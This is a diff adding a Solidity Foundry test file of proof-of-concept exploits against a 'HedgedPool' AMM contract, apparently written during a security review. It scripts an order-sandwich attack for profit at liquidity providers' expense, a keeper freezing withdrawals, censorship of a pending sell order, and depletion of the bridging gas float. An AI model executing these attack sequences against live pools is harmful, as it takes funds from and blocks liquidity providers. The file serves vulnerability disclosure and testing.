@@ -1,0 +1,167 @@
+// SPDX-License-Identifier: Apache-2.0
+pragma solidity ^0.8.20;
+
+import {Test} from "forge-std/Test.sol";
+import {Core, IERC20} from "../../src/Core.sol";
+import {HedgedPool} from "../../src/HedgedPool.sol";
+
+/// @dev A deliberately ordinary ERC20: these PoCs do not rely on token callbacks.
+contract R6Usdc {
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
+    function approve(address spender, uint256 amount) external returns (bool) {
+        allowance[msg.sender][spender] = amount;
+        return true;
+    }
+    function transfer(address to, uint256 amount) external returns (bool) {
+        balanceOf[msg.sender] -= amount;
+        balanceOf[to] += amount;
+        return true;
+    }
+    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
+        allowance[from][msg.sender] -= amount;
+        balanceOf[from] -= amount;
+        balanceOf[to] += amount;
+        return true;
+    }
+}
+
+contract R6Writer {
+    bytes[] public sent;
+    function sendRawAction(bytes calldata data) external { sent.push(data); }
+    function count() external view returns (uint256) { return sent.length; }
+}
+
+contract R6AsyncOrderAndFloatPoC is Test {
+    uint64 internal constant HYPE = 1105;
+    uint64 internal constant SPOT = 1035;
+
+    HedgedPool internal pool;
+    R6Usdc internal usdc;
+    address internal keeper = address(0xBEEF);
+    address internal attacker = address(0xA11CE);
+
+    function setUp() public {
+        vm.etch(address(Core.WRITER), address(new R6Writer()).code);
+        usdc = new R6Usdc();
+        pool = new HedgedPool(IERC20(address(usdc)), keeper, HYPE, SPOT, 2);
+        _core(HYPE, 1e6);
+        _core(Core.USDC, 0);
+        _px(40e6);
+
+        // Seed 100 HYPE / 4,000 USDC on EVM. The Core ops float is excluded.
+        vm.deal(keeper, 100 ether);
+        usdc.mint(keeper, 4_000e6);
+        vm.startPrank(keeper);
+        usdc.approve(address(pool), type(uint256).max);
+        pool.add{value: 100 ether}(4_000e6, 0);
+        vm.stopPrank();
+
+        vm.deal(attacker, 100 ether);
+        usdc.mint(attacker, 1_000e6);
+        vm.prank(attacker);
+        usdc.approve(address(pool), type(uint256).max);
+    }
+
+    function _core(uint64 token, uint64 amount) internal {
+        vm.mockCall(
+            Core.SPOT_BALANCE, abi.encode(address(pool), token), abi.encode(Core.SpotBalance(amount, 0, 0))
+        );
+    }
+
+    function _px(uint64 amount) internal {
+        vm.mockCall(Core.SPOT_PX, abi.encode(SPOT), abi.encode(amount));
+    }
+
+    /// Hyperliquid documents that CoreWriter order actions are delayed for seconds. `order()` does
+    /// not set quietUntil, so a trader can move the AMM price after the IOC is enqueued but before
+    /// it executes. The stale sell floor (41.58) becomes worse than the then-current pool price;
+    /// executing the old IOC lets the trader complete a Core/AMM sandwich at LP expense.
+    function test_PoC_pendingIocCanBeSandwichedAfterOrder() public {
+        // The keeper has already bridged 2 HYPE, so total pool inventory is still 100 HYPE.
+        _core(HYPE, 1e6 + 2e8);
+        _px(42e6);
+        vm.prank(keeper);
+        pool.order(true, 2 ether); // enqueues an IOC with a 41.58 USDC/HYPE floor
+
+        // This is allowed immediately: `order` did not set quietUntil.
+        uint256 attackerUsdcBefore = usdc.balanceOf(attacker);
+        vm.prank(attacker);
+        uint256 hypeBought = pool.swapUsdcForHype(200e6, 0);
+        assertGt(pool.poolPx(), 41.58e6, "front-run made the live AMM dearer than the IOC floor");
+
+        // Model the delayed IOC subsequently filling 2 HYPE at the 42-USDC Core market.
+        _core(HYPE, 1e6);
+        _core(Core.USDC, 84e8);
+
+        // The attacker's Core sale and repurchase at 42 are net-zero HYPE/USDC. They now sell the
+        // HYPE acquired in the front-run back into the AMM's post-fill, stale-price inventory.
+        vm.prank(attacker);
+        pool.swapHypeForUsdc{value: hypeBought}(0);
+
+        assertGt(
+            usdc.balanceOf(attacker), attackerUsdcBefore,
+            "Core/AMM sandwich realizes USDC profit while the delayed IOC executed below live pool price"
+        );
+    }
+
+    /// The keeper may set the floor to every Core USDC wei. That makes permissionless liquidity
+    /// recovery impossible and a normal LP withdrawal remains blocked until that same keeper acts.
+    function test_PoC_keeperCanFreezeCoreUsdcPayoutLiquidityWithFloor() public {
+        _core(Core.USDC, 200e8);
+        vm.prank(keeper);
+        pool.setFloatFloor(200e8);
+
+        vm.prank(attacker);
+        vm.expectRevert(HedgedPool.TooSmall.selector);
+        pool.toEvm(0, 200e8);
+
+        uint256 shares = pool.shares(keeper);
+        vm.prank(keeper);
+        vm.expectRevert(abi.encodeWithSelector(HedgedPool.NotEnoughEvmUsdc.selector, 4_000e6));
+        pool.remove(shares, 0, 0);
+    }
+
+    /// Unlike USDC, HYPE has no protected floor. A public Core->EVM send is processed after the
+    /// EVM block, whereas the IOC remains on HyperCore's documented several-second delay. An
+    /// observer can therefore remove the sell IOC's whole input balance before the IOC executes.
+    /// This costs the observer only gas and can be repeated after each re-bridge.
+    function test_PoC_anyoneCanCensorPendingSellIocByMovingItsHype() public {
+        _core(HYPE, 1e6 + 2e8);
+        _px(42e6);
+        vm.prank(keeper);
+        pool.order(true, 2 ether);
+
+        vm.prank(attacker);
+        pool.toEvm(2e8, 0);
+
+        R6Writer writer = R6Writer(address(Core.WRITER));
+        assertEq(writer.count(), 2, "order and public send were both accepted");
+        // Model sendAsset's post-block Core execution. The delayed IOC now has no HYPE to sell.
+        _core(HYPE, 1e6);
+        assertEq(pool.coreH(), 0, "the pending sell's entire input can be moved away");
+        assertGt(pool.quietUntil(), block.number, "the attacker also pauses all pool operations");
+    }
+
+    /// A Core->EVM USDC send consumes Core HYPE for gas (as documented and measured by this
+    /// project). `toEvm` is public, but even a one-wei reduction below KEEP_HYPE_WEI makes every
+    /// later `bridgeHype` revert. The attacker needs only one qualifying USDC send; the keeper
+    /// must notice and pay another operational top-up before the pool can sell HYPE on Core.
+    function test_PoC_publicUsdcSendCanDepleteOpsThresholdAndStopBridging() public {
+        _core(Core.USDC, 11e8);
+        vm.prank(attacker);
+        pool.toEvm(0, 11e8);
+
+        // Model the documented Core-side HYPE fee charged when the queued USDC send executes.
+        _core(HYPE, uint64(pool.KEEP_HYPE_WEI() - 1));
+        _core(Core.USDC, 0);
+        vm.roll(pool.quietUntil() + 1);
+        _px(42e6);
+
+        vm.prank(keeper);
+        vm.expectRevert(HedgedPool.NoOpsFloat.selector);
+        pool.bridgeHype(1 ether);
+    }
+}
